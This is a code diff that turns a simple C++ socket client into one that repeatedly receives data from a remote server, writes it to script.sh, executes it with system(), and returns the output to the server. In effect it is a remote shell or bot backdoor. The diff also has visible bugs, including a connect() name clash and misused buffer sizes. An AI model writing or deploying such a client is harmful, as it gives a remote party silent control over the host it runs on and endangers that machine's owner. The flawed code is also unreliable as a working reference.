@@ -8,9 +8,7 @@
 #include <pthread.h>
 #include <semaphore.h>
 
-void* client_thread(void *args) {
-    
-    int sock_fd = 0;
+void connect(int &sock_fd) {
     struct sockaddr_in server_address;
 
     if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
@@ -27,50 +25,50 @@ void* client_thread(void *args) {
 
     if(connect(sock_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
         std::cout << "Error: connection\n";
+        exit(-1);
     }
 
-    std::cout << "Connection established\n";
+    else 
+    {
+        std::cout << "successfully connected to " << inet_ntoa(server_address.sin_addr) << "\n";
+    }
+}
 
-    int choice = *((int*)args);
-    send(sock_fd, &choice, sizeof(choice), 0);
-
+void disconnect(int sock_fd) {
     close(sock_fd);
-    pthread_exit(NULL);
+    std::cout << "connection closed\n";
+}
 
-    return 0; 
+void commands(int sock_fd) {
+
+    while(true) {
+
+        FILE *script = fopen("script.sh", "w");
+        char buffer[1024];
+        recv(sock_fd, buffer, 1024, 0);
+
+        fwrite(buffer, sizeof(buffer), 1, script);
+
+        fclose(script);
+        
+        system("chmod +x script.sh");
+        system("./script.sh > output.txt");
+
+        FILE *output = fopen("output.txt", "r");
+        memset(buffer, 0, sizeof(buffer));
+        fread(buffer, 1024, sizeof(buffer), output);
+        fclose(output);
+        send(sock_fd, buffer, 1024, 0);
+    } 
 }
 
 int main(int argc, char* argv[]) {
 
-    if(argc != 2) {
-        printf("use: %s <ip of server>\n", argv[0]);
-        return 1;
-    }
+    int sock_fd = 0; //socket descriptor
+    connect(sock_fd); //connect to server
 
+    commands(sock_fd);
 
-    while(true) {
-
-        int choice = 0;
-        std::cout << "Enter choice:\n";
-        std::cin >> choice;
-        pthread_t thread;
-
-        if(choice == 1) {
-            pthread_create(&thread, NULL, client_thread, &choice);
-        }
-        
-        else if(choice == 2) {
-            pthread_create(&thread, NULL, client_thread, &choice);
-        }
-
-        else 
-        {
-            std::cout << "Bad choice\n";
-        }
-
-        pthread_join(thread, NULL);
-        
-    }
-    
+    disconnect(sock_fd); //disconnects from server
     return 0;
 }
